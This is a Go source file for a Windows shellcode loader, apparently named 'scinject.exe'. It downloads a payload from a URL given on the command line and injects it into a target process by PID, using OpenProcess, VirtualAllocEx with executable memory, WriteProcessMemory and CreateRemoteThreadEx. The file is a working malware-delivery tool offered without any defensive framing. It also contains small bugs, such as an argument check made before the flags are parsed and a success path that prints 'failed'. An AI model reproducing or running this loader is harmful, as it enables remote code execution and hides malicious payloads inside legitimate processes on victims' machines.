package main

import (
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"

	"golang.org/x/sys/windows"
	"unsafe"
)

func xor(b, k []byte) ([]byte, error) {
	if len(k) == 0 {
		return nil, fmt.Errorf("Key too short")
	}

	xb := make([]byte, 0, len(b))
	for i := 0; i < len(b); i++ {
		xb = append(xb, b[i]^k[i%len(k)])
	}

	return xb, nil
}

func fetchPayload(url string) ([]byte, error) {
	resp, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

func main() {

	// key := byte(333)

	if flag.NArg() < 1 {
		fmt.Println("Error: Missing PID Arg. Usage: scinject.exe <PID>")
		os.Exit(1)
	}

	var url string
	flag.StringVar(&url, "url", "", "url to shellcode")

	flag.Parse()

	if url == "" {
		fmt.Println("No URL provided")
	}

	sc, err := fetchPayload(url)
	if err != nil {
		fmt.Printf("Error: fetch failure: %v\n", err)
		os.Exit(1)
	}

	pid, err := strconv.ParseUint(flag.Arg(0), 10, 32)
	if err != nil {
		fmt.Printf("Error parsing PID %v\n", err)
		os.Exit(1)
	}
	pid32 := uint32(pid)

	/* Open Process */
	hProcess, err := windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, pid32)
	if err != nil {
		fmt.Printf("Error opening process {%d}: %v\n", pid32, err)
		os.Exit(1)
	}
	defer windows.CloseHandle(hProcess)

	fmt.Printf("Handle recieved on process {%d}: %v\n", pid32, hProcess)

	kernel32dll := windows.NewLazyDLL("kernel32.dll")
	pVirtualAllocEx := kernel32dll.NewProc("VirtualAllocEx")

	/*
		LPVOID VirtualAllocEx(
			  [in]           HANDLE hProcess,
			    [in, optional] LPVOID lpAddress,
			      [in]           SIZE_T dwSize,
			        [in]           DWORD  flAllocationType,
			          [in]           DWORD  flProtect
			          );
		)
	*/

	rAddr, _, err := pVirtualAllocEx.Call(uintptr(hProcess),
		uintptr(0),
		uintptr(len(sc)),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_EXECUTE_READWRITE))
	if rAddr == 0 {
		fmt.Println(err)
	}

	/* write to buffer */
	err = windows.WriteProcessMemory(hProcess, rAddr, &sc[0], uintptr(len(sc)), nil)
	if err != nil {
		fmt.Printf("WriteProcessMemeory failed: %v\n", err)
		os.Exit(1)
	}

	/* creating threads */
	pCreateRemoteThreadEx := kernel32dll.NewProc("CreateRemoteThreadEx")

	var tid uint32
	hThread, _, err := pCreateRemoteThreadEx.Call(uintptr(hProcess),
		uintptr(0),
		uintptr(0),
		rAddr,
		uintptr(0),
		uintptr(0),
		uintptr(0),
		uintptr(unsafe.Pointer(&tid)))

	if hThread == 0 {
		fmt.Printf("CreateRemoteThreadEx failed: %v\n", err)
		os.Exit(1)

	}
	fmt.Printf("CreateRemoteThreadEx failed: %v\n", err)
}
